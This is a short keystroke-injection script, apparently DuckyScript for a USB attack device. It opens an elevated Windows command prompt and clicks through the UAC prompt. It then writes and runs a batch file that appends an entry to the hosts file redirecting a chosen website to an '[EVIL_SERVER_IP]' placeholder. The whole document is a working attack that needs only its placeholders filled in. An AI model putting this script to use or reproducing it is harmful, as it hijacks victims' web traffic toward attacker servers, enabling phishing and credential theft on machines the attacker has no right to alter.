REM ---[Start CMD as administrator]-----------------------
GUI
DELAY 50
STRING cmd
DELAY 150
MENU
DELAY 75
STRING a
ENTER
DELAY 200
LEFT
ENTER
STRING cls
ENTER
REM ---[END]----------------------------------------------
DELAY 300
REM ---[Inject into the host file]------------------------
STRING copy con inject.bat
ENTER
STRING SET NEWLINE=^& echo.
ENTER
ENTER
STRING FIND /C /I "[WEBSITE_ADDRESS]" %WINDIR%\system32\drivers\etc\hosts
ENTER
STRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] [WEBSITE_ADDRESS]>>%WINDIR%\system32\drivers\etc\hosts
ENTER
ENTER
STRING FIND /C /I "[WEBSITE_ADDRESS]" %WINDIR%\system32\drivers\etc\hosts
ENTER
STRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] [WEBSITE_ADDRESS]>>%WINDIR%\system32\drivers\etc\hosts
ENTER
CONTROL z
ENTER
STRING inject.bat
ENTER
REM ---[END]----------------------------------------------
DELAY 200
STRING exit
ENTER